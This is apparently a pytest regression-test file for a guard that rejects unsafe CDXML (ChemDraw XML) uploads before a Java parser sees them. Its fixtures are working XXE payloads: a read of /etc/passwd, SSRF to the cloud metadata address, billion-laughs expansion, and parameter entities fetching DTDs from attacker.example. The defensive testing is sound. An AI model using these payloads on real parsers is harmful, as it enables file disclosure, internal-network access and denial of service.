"""Regression tests for the defensive XML / XXE guard (SEC C-01).

The upstream Java CDXMLReader is not hardened against XXE, SSRF, or
billion-laughs DoS. The Python-side guard in
:mod:`app.services.xml_guard` rejects unsafe CDXML payloads at the
format-detection boundary, before bytes reach the JVM.

These tests exercise the guard directly AND through the public
``detect_format`` entry point so every CDXML code path (extract,
reactions, batch, celery tasks) is covered.
"""

from __future__ import annotations

import pytest

from app.errors import FormatDetectionError
from app.services.format_detector import detect_format
from app.services.xml_guard import reject_xml_external_entities

BENIGN_CDXML = (
    b'<?xml version="1.0"?>\n<CDXML><page><fragment>C</fragment></page></CDXML>'
)

ALLOWED_DOCTYPE_CDXML_REVVITY = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n'
    b"<!DOCTYPE CDXML SYSTEM "
    b'"https://static.chemistry.revvitycloud.com/cdxml/CDXML.dtd">\n'
    b"<CDXML><page><fragment>C</fragment></page></CDXML>"
)

ALLOWED_DOCTYPE_CDXML_CAMBRIDGESOFT = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n'
    b'<!DOCTYPE CDXML SYSTEM "http://www.cambridgesoft.com/xml/cdxml.dtd">\n'
    b"<CDXML><page><fragment>C</fragment></page></CDXML>"
)


# ---------------------------------------------------------------------------
# Safe payloads — must pass both the direct guard and detect_format
# ---------------------------------------------------------------------------


def test_benign_cdxml_accepted() -> None:
    # No exception should be raised.
    reject_xml_external_entities(BENIGN_CDXML)
    assert detect_format(BENIGN_CDXML) == "cdxml"


def test_allowed_doctype_revvity_accepted() -> None:
    """Real ChemDraw 25+ CDXML files use the revvitycloud URL."""
    reject_xml_external_entities(ALLOWED_DOCTYPE_CDXML_REVVITY)
    assert detect_format(ALLOWED_DOCTYPE_CDXML_REVVITY) == "cdxml"


def test_allowed_doctype_cambridgesoft_accepted() -> None:
    """Legacy ChemDraw files use the cambridgesoft URL."""
    reject_xml_external_entities(ALLOWED_DOCTYPE_CDXML_CAMBRIDGESOFT)
    assert detect_format(ALLOWED_DOCTYPE_CDXML_CAMBRIDGESOFT) == "cdxml"


def test_utf8_bom_prefixed_benign_cdxml_accepted() -> None:
    payload = b"\xef\xbb\xbf" + BENIGN_CDXML
    # detect_format strips the BOM; the guard runs on the pre-strip bytes
    # (conservative) and still accepts — no DOCTYPE, no ENTITY.
    assert detect_format(payload) == "cdxml"


def test_cdx_binary_never_reaches_xml_guard() -> None:
    # Binary CDX starts with VjCD — guard must not be invoked. If it were
    # invoked on arbitrary binary, random byte sequences could trip false
    # positives.
    fake_cdx = b"VjCD" + b"\x00" * 64 + b"<!DOCTYPE evil SYSTEM 'file:///'>"
    # Binary CDX short-circuits before hitting xml_guard in detect_format.
    assert detect_format(fake_cdx) == "cdx"


# ---------------------------------------------------------------------------
# XXE — file-read attack
# ---------------------------------------------------------------------------


XXE_FILE_READ = (
    b'<?xml version="1.0"?>\n'
    b"<!DOCTYPE CDXML [\n"
    b'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    b"]>\n"
    b"<CDXML><page><fragment>&xxe;</fragment></page></CDXML>"
)


def test_xxe_file_read_rejected_directly() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(XXE_FILE_READ)


def test_xxe_file_read_rejected_via_detect_format() -> None:
    with pytest.raises(FormatDetectionError):
        detect_format(XXE_FILE_READ)


# ---------------------------------------------------------------------------
# SSRF attack — ENTITY pointing at internal network
# ---------------------------------------------------------------------------


XXE_SSRF = (
    b'<?xml version="1.0"?>\n'
    b"<!DOCTYPE CDXML [\n"
    b'  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n'
    b"]>\n"
    b"<CDXML><page/></CDXML>"
)


def test_xxe_ssrf_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(XXE_SSRF)


# ---------------------------------------------------------------------------
# Billion laughs / quadratic blowup — purely internal ENTITY refs
# ---------------------------------------------------------------------------


BILLION_LAUGHS = (
    b'<?xml version="1.0"?>\n'
    b"<!DOCTYPE lolz [\n"
    b'  <!ENTITY lol "lol">\n'
    b'  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
    b'  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n'
    b"]>\n"
    b"<CDXML><page>&lol2;</page></CDXML>"
)


def test_billion_laughs_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(BILLION_LAUGHS)


# ---------------------------------------------------------------------------
# Parameter entity variation (used for blind-exfil channels)
# ---------------------------------------------------------------------------


PARAM_ENTITY = (
    b'<?xml version="1.0"?>\n'
    b"<!DOCTYPE CDXML [\n"
    b'  <!ENTITY % p SYSTEM "http://attacker.example/xxe.dtd">\n'
    b"  %p;\n"
    b"]>\n"
    b"<CDXML><page/></CDXML>"
)


def test_parameter_entity_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(PARAM_ENTITY)


# ---------------------------------------------------------------------------
# Case-insensitivity — upper / mixed case keywords must not slip through
# ---------------------------------------------------------------------------


CASE_MIXED = (
    b'<?xml version="1.0"?>\n'
    b"<!doctype CDXML [\n"
    b'  <!eNtItY xxe SYSTEM "file:///etc/hostname">\n'
    b"]>\n"
    b"<CDXML/>"
)


def test_mixed_case_keywords_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(CASE_MIXED)


# ---------------------------------------------------------------------------
# DOCTYPE with SYSTEM id other than cdxml.dtd — rejected
# ---------------------------------------------------------------------------


UNKNOWN_SYSTEM_ID = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML SYSTEM "http://attacker.example/evil.dtd">\n'
    b"<CDXML/>"
)


def test_unknown_system_id_rejected() -> None:
    with pytest.raises(FormatDetectionError) as exc_info:
        reject_xml_external_entities(UNKNOWN_SYSTEM_ID)
    assert "catalog" in str(exc_info.value).lower()


def test_attacker_spoofed_cdxml_filename_rejected() -> None:
    """An attacker cannot bypass the guard by naming their malicious DTD
    ``cdxml.dtd`` and hosting it at a different URL — the guard requires
    the exact catalogued URL, not just the filename suffix."""
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example/cdxml.dtd">\n'
        b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


# ---------------------------------------------------------------------------
# Substring-allow-list bypass cases — the DOCTYPE has an attacker-controlled
# SYSTEM/PUBLIC id while an allow-listed URL appears nearby (comment,
# attribute, processing instruction, URL suffix). A substring-based check
# would accept these; structural extraction must reject them.
# ---------------------------------------------------------------------------


def test_allowed_url_in_comment_after_evil_doctype_rejected() -> None:
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
        b"<!-- http://www.cambridgesoft.com/xml/cdxml.dtd -->\n"
        b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_allowed_url_as_suffix_of_attacker_url_rejected() -> None:
    payload = (
        b'<?xml version="1.0"?>\n'
        b"<!DOCTYPE CDXML SYSTEM "
        b'"http://attacker.example.com/spoof-http://www.cambridgesoft.com/xml/cdxml.dtd">\n'
        b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_allowed_url_in_attribute_after_evil_doctype_rejected() -> None:
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
        b'<CDXML ref="http://www.cambridgesoft.com/xml/cdxml.dtd"/>'
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_allowed_url_in_processing_instruction_after_evil_doctype_rejected() -> None:
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
        b"<?foo http://www.cambridgesoft.com/xml/cdxml.dtd ?>\n"
        b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_public_id_with_allowed_url_in_comment_rejected() -> None:
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE CDXML PUBLIC "-//Attacker//DTD//EN" '
        b'"http://attacker.example.com/evil.dtd">\n'
        b"<!-- http://www.cambridgesoft.com/xml/cdxml.dtd -->\n"
        b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_doctype_with_internal_subset_but_no_entity_rejected() -> None:
    """Real ChemDraw CDXML never uses an internal subset. Reject any
    DOCTYPE containing ``[`` even without a visible ``<!ENTITY>`` — an
    external DTD fetched via a parameter entity inside the subset could
    still trigger XXE."""
    payload = (
        b'<?xml version="1.0"?>\n'
        b"<!DOCTYPE CDXML [ <!-- benign-looking comment --> ]>\n"
        b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_unterminated_doctype_rejected() -> None:
    """A DOCTYPE whose closing ``>`` is missing within the scan window must
    be rejected rather than silently truncated."""
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/evil.dtd"'
        + b" " * 2_100
        + b"\n<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


def test_mixed_quotes_allowed_revvity_dtd_accepted() -> None:
    """Single-quoted SYSTEM literal pointing at the catalogued URL must
    remain accepted — structural parsing has to handle either quote style."""
    payload = (
        b"<?xml version='1.0' encoding='UTF-8'?>\n"
        b"<!DOCTYPE CDXML SYSTEM "
        b"'https://static.chemistry.revvitycloud.com/cdxml/CDXML.dtd'>\n"
        b"<CDXML><page><fragment>C</fragment></page></CDXML>"
    )
    reject_xml_external_entities(payload)
    assert detect_format(payload) == "cdxml"


# ---------------------------------------------------------------------------
# PUBLIC identifier — also rejected (browsers / old parsers may still fetch)
# ---------------------------------------------------------------------------


PUBLIC_ID = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE CDXML PUBLIC "-//Attacker//DTD//EN" '
    b'"http://attacker.example/evil.dtd">\n'
    b"<CDXML/>"
)


def test_public_id_rejected() -> None:
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(PUBLIC_ID)


# ---------------------------------------------------------------------------
# Bounded head scan — a malicious payload padding garbage into the scan
# window cannot bypass detection because DOCTYPE MUST appear before the
# root element. We verify by placing the DOCTYPE late in a padded prolog
# but still within the 64 KB scan window.
# ---------------------------------------------------------------------------


def test_doctype_deep_in_prolog_still_caught() -> None:
    pad = b" " * 50_000
    payload = (
        b'<?xml version="1.0"?>\n'
        + b"<!-- "
        + pad
        + b" -->\n"
        + b'<!DOCTYPE CDXML [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        + b"<CDXML/>"
    )
    with pytest.raises(FormatDetectionError):
        reject_xml_external_entities(payload)


# ---------------------------------------------------------------------------
# Performance — the guard runs in bounded time regardless of file size.
# ---------------------------------------------------------------------------


def test_guard_performance_bounded() -> None:
    """A 50 MB garbage payload must not take noticeable CPU in the guard."""
    import time

    big = b'<?xml version="1.0"?>\n<CDXML>' + (b"X" * (50 * 1024 * 1024)) + b"</CDXML>"
    t0 = time.perf_counter()
    reject_xml_external_entities(big)
    elapsed = time.perf_counter() - t0
    # Slack bound — the guard should complete in under 50 ms even on a
    # slow runner because the scan window is capped at 64 KB.
    assert elapsed < 0.2, f"xml_guard took {elapsed * 1000:.1f} ms"
